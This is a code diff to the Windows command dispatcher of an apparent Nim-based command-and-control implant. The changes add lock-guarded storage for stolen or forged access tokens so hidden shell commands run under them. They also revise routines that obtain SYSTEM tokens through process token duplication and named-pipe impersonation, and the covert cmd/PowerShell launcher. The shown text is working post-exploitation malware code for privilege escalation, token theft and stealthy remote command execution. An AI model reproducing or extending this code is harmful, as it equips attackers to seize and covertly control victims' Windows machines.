@@ -1,5 +1,5 @@
 ## Command dispatcher for Nim agent — Windows + Linux.
-import std/[os, osproc, strutils, strformat, json, random, base64, sequtils, times, tables]
+import std/[os, osproc, strutils, strformat, json, random, base64, sequtils, times, tables, locks]
 import config, transport, evasion, portfwd
 
 var gBofStore = initTable[string, seq[byte]]()
@@ -42,6 +42,10 @@ when defined(windows):
   # CreateProcessWithTokenW so shell commands run as SYSTEM regardless
   # of which thread dispatches them (thread impersonation is per-thread).
   var gSystemToken: HANDLE = 0
+  # Primary token from steal-token/make-token; used by runShell when gSystemToken is 0.
+  var gStolenToken: HANDLE = 0
+  var gTokenLock: Lock
+  initLock(gTokenLock)
 
   proc CreateProcessWithTokenW(
     hToken: HANDLE, dwLogonFlags: DWORD,
@@ -131,7 +135,14 @@ proc extractFilename(path: string): string =
 proc runShell*(cmd: string): string =
   try:
     when defined(windows):
-      if gSystemToken != 0:
+      let activeTok = block:
+        acquire(gTokenLock)
+        let t = if gSystemToken != 0: gSystemToken
+                elif gStolenToken != 0: gStolenToken
+                else: HANDLE(0)
+        release(gTokenLock)
+        t
+      if activeTok != 0:
         # ── Privilege setup ───────────────────────────────────────────────────
         var hSelf: HANDLE
         if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
@@ -140,14 +151,15 @@ proc runShell*(cmd: string): string =
           discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
           discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
           discard CloseHandle(hSelf)
-        discard enablePriv(gSystemToken, "SeImpersonatePrivilege")
-        discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
-        discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
+        discard enablePriv(activeTok, "SeImpersonatePrivilege")
+        discard enablePriv(activeTok, "SeIncreaseQuotaPrivilege")
+        discard enablePriv(activeTok, "SeAssignPrimaryTokenPrivilege")
 
         # Use the same stable token-launch path as the Go agent.  Redirecting
         # in the child avoids anonymous-pipe inheritance problems across
         # sessions and lets us validate the process exit/capture result.
-        let uid = toHex(int64(GetCurrentProcessId()) xor int64(GetTickCount()), 16)
+        let uid = toHex(int64(GetCurrentProcessId()) xor int64(GetTickCount()) xor
+                        (int64(GetCurrentThreadId()) shl 32), 16)
         let outPath = "C:\\Windows\\Temp\\sbo" & uid & ".tmp"
         let shellArgs = "/d /c " & cmd & " > \"" & outPath & "\" 2>&1"
         var si2: STARTUPINFOW; zeroMem(addr si2, sizeof(si2))
@@ -158,28 +170,28 @@ proc runShell*(cmd: string): string =
         let cwdW2 = newWideCString("C:\\Windows\\System32")
         var argsW2 = newWideCString(shellArgs)
         var argsAsUserW = newWideCString(shellArgs)
-        var procOk2 = CreateProcessWithTokenW(gSystemToken, 0, appW2, argsW2,
+        var procOk2 = CreateProcessWithTokenW(activeTok, 0, appW2, argsW2,
           CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
         var withTokenErr: DWORD = if procOk2 != 0: 0 else: GetLastError()
         var asUserErr: DWORD = 0
         var impersonateErr: DWORD = 0
         if procOk2 == 0:
-          procOk2 = CreateProcessAsUserW(gSystemToken, appW2, argsAsUserW, nil, nil,
+          procOk2 = CreateProcessAsUserW(activeTok, appW2, argsAsUserW, nil, nil,
             WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
           if procOk2 == 0: asUserErr = GetLastError()
         if procOk2 == 0:
           # Last fallback for tokens that cannot be used directly by either
-          # primary-token API: impersonate SYSTEM on this thread and retry.
-          if ImpersonateLoggedOnUser(gSystemToken) != 0:
+          # primary-token API: impersonate on this thread and retry.
+          if ImpersonateLoggedOnUser(activeTok) != 0:
             var retryW = newWideCString(shellArgs)
-            procOk2 = CreateProcessWithTokenW(gSystemToken, 0, appW2, retryW,
+            procOk2 = CreateProcessWithTokenW(activeTok, 0, appW2, retryW,
               CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
             if procOk2 == 0: withTokenErr = GetLastError()
             discard RevertToSelf()
           else:
             impersonateErr = GetLastError()
         if procOk2 == 0:
-          return "[error: SYSTEM shell launch; WithToken=" & $withTokenErr &
+          return "[error: token shell launch; WithToken=" & $withTokenErr &
             "; AsUser=" & $asUserErr & "; Impersonate=" & $impersonateErr & "]"
         let waitRes = WaitForSingleObject(pi2.hProcess, DWORD(60000))
         var exitCode: DWORD = DWORD(259)
@@ -192,7 +204,7 @@ proc runShell*(cmd: string): string =
         try: output2 = readFile(outPath) except: discard
         discard DeleteFileA(outPath)
         if output2.len == 0 and exitCode != 0:
-          return "[error: SYSTEM shell capture empty; exit=" & $exitCode &
+          return "[error: token shell capture empty; exit=" & $exitCode &
             "; WithToken=" & $withTokenErr & "; AsUser=" & $asUserErr &
             "; Impersonate=" & $impersonateErr & "]"
         return output2
@@ -841,11 +853,14 @@ when defined(windows):
     let logonErr = GetLastError()
 
     var impersonated = false
-    if gSystemToken != 0 and ImpersonateLoggedOnUser(gSystemToken) != 0:
+    acquire(gTokenLock)
+    let snapSysTok = gSystemToken
+    release(gTokenLock)
+    if snapSysTok != 0 and ImpersonateLoggedOnUser(snapSysTok) != 0:
       impersonated = true
-      discard enablePriv(gSystemToken, "SeImpersonatePrivilege")
-      discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
-      discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
+      discard enablePriv(snapSysTok, "SeImpersonatePrivilege")
+      discard enablePriv(snapSysTok, "SeIncreaseQuotaPrivilege")
+      discard enablePriv(snapSysTok, "SeAssignPrimaryTokenPrivilege")
     var selfToken: HANDLE = 0
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
         addr selfToken) != 0:
@@ -945,14 +960,26 @@ when defined(windows):
     if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
       return "OpenProcessToken failed (err " & $GetLastError() & ")"
     defer: discard CloseHandle(hTok)
+    # Impersonation token for ImpersonateLoggedOnUser (thread-level).
     var hDup: HANDLE
     discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
       securityImpersonation, tokenImpersonation, addr hDup)
     if hDup == 0: return "DuplicateTokenEx failed (err " & $GetLastError() & ")"
+    # Primary token for CreateProcessWithTokenW in runShell (process-level).
+    let hPrim = duplicatePrimaryShellToken(hTok)
+    if hPrim == 0:
+      discard CloseHandle(hDup)
+      return "DuplicateTokenEx (primary) failed (err " & $GetLastError() & ")"
     if ImpersonateLoggedOnUser(hDup) == 0:
       discard CloseHandle(hDup)
+      discard CloseHandle(hPrim)
       return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
     discard CloseHandle(hDup)
+    acquire(gTokenLock)
+    let old = gStolenToken
+    gStolenToken = hPrim
+    release(gTokenLock)
+    if old != 0: discard CloseHandle(old)
     return "[+] impersonating token from PID " & $pid
 
   proc doTokenMake(user, domain, pass: string): string =
@@ -960,14 +987,31 @@ when defined(windows):
     if LogonUserW(newWideCString(user), newWideCString(domain), newWideCString(pass),
         LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, addr hTok) == 0:
       return "LogonUser failed (err " & $GetLastError() & ")"
+    # Primary token for CreateProcessWithTokenW in runShell (process-level).
+    let hPrim = duplicatePrimaryShellToken(hTok)
+    if hPrim == 0:
+      discard CloseHandle(hTok)
+      return "DuplicateTokenEx (primary) failed (err " & $GetLastError() & ")"
     if ImpersonateLoggedOnUser(hTok) == 0:
       discard CloseHandle(hTok)
+      discard CloseHandle(hPrim)
       return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
     discard CloseHandle(hTok)
+    acquire(gTokenLock)
+    let old = gStolenToken
+    gStolenToken = hPrim
+    release(gTokenLock)
+    if old != 0: discard CloseHandle(old)
     return "[+] impersonating " & domain & "\\" & user
 
   proc doTokenDrop(): string =
-    discard RevertToSelf(); return "[+] reverted to original token"
+    discard RevertToSelf()
+    acquire(gTokenLock)
+    let old = gStolenToken
+    gStolenToken = 0
+    release(gTokenLock)
+    if old != 0: discard CloseHandle(old)
+    return "[+] reverted to original token"
 
   proc doTokenWhoami(): string =
     var buf: array[512, WCHAR]; var sz = DWORD(buf.len)
@@ -1013,8 +1057,11 @@ when defined(windows):
         discard CloseHandle(hDup); (if hPrim != 0: discard CloseHandle(hPrim)); break t1
       discard CloseHandle(hDup)
       normalizeTokenSession(hPrim)
-      if gSystemToken != 0: discard CloseHandle(gSystemToken)
+      acquire(gTokenLock)
+      let oldSys1 = gSystemToken
       gSystemToken = hPrim
+      release(gTokenLock)
+      if oldSys1 != 0: discard CloseHandle(oldSys1)
       return "[+] T1 SYSTEM (" & matchName & " PID=" & $sysPid & ")"
 
     # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
@@ -1075,8 +1122,11 @@ when defined(windows):
         discard CloseHandle(hThr)
         if hPrim != 0:
           normalizeTokenSession(hPrim)
-          if gSystemToken != 0: discard CloseHandle(gSystemToken)
+          acquire(gTokenLock)
+          let oldSys2 = gSystemToken
           gSystemToken = hPrim
+          release(gTokenLock)
+          if oldSys2 != 0: discard CloseHandle(oldSys2)
           storedT2 = true
     if not storedT2:
       return "[-] T1+T2 failed (DuplicateTokenEx primary token)"
@@ -1137,7 +1187,10 @@ when defined(windows):
     let shellExe = if shellIsPs: "powershell.exe" else: "cmd.exe"
     var procOk: WINBOOL = 0
     var launchErr: DWORD = 0
-    if gSystemToken != 0:
+    acquire(gTokenLock)
+    let snapSysTokIsh = gSystemToken
+    release(gTokenLock)
+    if snapSysTokIsh != 0:
       var hSelf: HANDLE
       if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
           addr hSelf) != 0:
@@ -1145,9 +1198,9 @@ when defined(windows):
         discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
         discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
         discard CloseHandle(hSelf)
-      discard enablePriv(gSystemToken, "SeImpersonatePrivilege")
-      discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
-      discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
+      discard enablePriv(snapSysTokIsh, "SeImpersonatePrivilege")
+      discard enablePriv(snapSysTokIsh, "SeIncreaseQuotaPrivilege")
+      discard enablePriv(snapSysTokIsh, "SeAssignPrimaryTokenPrivilege")
       let appPath = if shellIsPs: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" else: "C:\\Windows\\System32\\cmd.exe"
       let childArgs = if shellIsPs: "-NoLogo -NoProfile -NonInteractive" else: "/Q"
       let appW = newWideCString(appPath)
@@ -1157,18 +1210,18 @@ when defined(windows):
       # it can inherit the pipe handles across sessions without getting
       # STATUS_DLL_INIT_FAILED.  Fall back to CreateProcessWithTokenW if
       # SeAssignPrimaryTokenPrivilege is unavailable.
-      procOk = CreateProcessAsUserW(gSystemToken, appW, argsAsUserW, nil, nil,
+      procOk = CreateProcessAsUserW(snapSysTokIsh, appW, argsAsUserW, nil, nil,
         WINBOOL(1), CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
       launchErr = if procOk != 0: 0 else: GetLastError()
       if procOk == 0:
-        procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, argsW,
+        procOk = CreateProcessWithTokenW(snapSysTokIsh, 0, appW, argsW,
           CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
         if procOk == 0: launchErr = GetLastError()
       if procOk == 0:
-        let impOk = ImpersonateLoggedOnUser(gSystemToken)
+        let impOk = ImpersonateLoggedOnUser(snapSysTokIsh)
         if impOk != 0:
           var retryW = newWideCString(childArgs)
-          procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, retryW,
+          procOk = CreateProcessWithTokenW(snapSysTokIsh, 0, appW, retryW,
             CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
           if procOk == 0: launchErr = GetLastError()
           discard RevertToSelf()
@@ -1261,7 +1314,10 @@ when defined(windows):
     gClipStop = true; return 0
 
   # ── File search ──────────────────────────────────────────────────────────────
-  proc searchDir(dir, pattern: string; results: var seq[string]; limit: int) =
+  type PPathMatchSpec = proc(pszFile, pszSpec: LPWSTR): WINBOOL {.stdcall.}
+
+  proc searchDirImpl(dir, pattern: string; results: var seq[string]; limit: int;
+                     pmatch: PPathMatchSpec) =
     if results.len >= limit: return
     let findPath = dir & "\\*"
     var fd: WIN32_FIND_DATAW
@@ -1273,19 +1329,23 @@ when defined(windows):
       if name != "." and name != "..":
         let full = dir & "\\" & name
         if (fd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0:
-          searchDir(full, pattern, results, limit)
+          searchDirImpl(full, pattern, results, limit, pmatch)
         else:
           var matched = false
-          let hShl = LoadLibraryA("shlwapi.dll")
-          if hShl != 0:
-            type PMS = proc(pszFile, pszSpec: LPWSTR): WINBOOL {.stdcall.}
-            let fn = cast[PMS](GetProcAddress(hShl, "PathMatchSpecW"))
-            if fn != nil: matched = fn(newWideCString(name), newWideCString(pattern)).bool
-            discard FreeLibrary(hShl)
+          if pmatch != nil:
+            matched = pmatch(newWideCString(name), newWideCString(pattern)).bool
           if not matched:
             matched = name.toLowerAscii.contains(pattern.strip(chars={'*','?'}).toLowerAscii)
           if matched and results.len < limit: results.add(full)
       if FindNextFileW(h, addr fd) == 0: break
+
+  proc searchDir(dir, pattern: string; results: var seq[string]; limit: int) =
+    let hShl = LoadLibraryA("shlwapi.dll")
+    let pmatch: PPathMatchSpec =
+      if hShl != 0: cast[PPathMatchSpec](GetProcAddress(hShl, "PathMatchSpecW"))
+      else: nil
+    searchDirImpl(dir, pattern, results, limit, pmatch)
+    if hShl != 0: discard FreeLibrary(hShl)
 
   # ── Windows SOCKS5 ───────────────────────────────────────────────────────────
   proc socksRelayProc(p: LPVOID): DWORD {.stdcall.} =
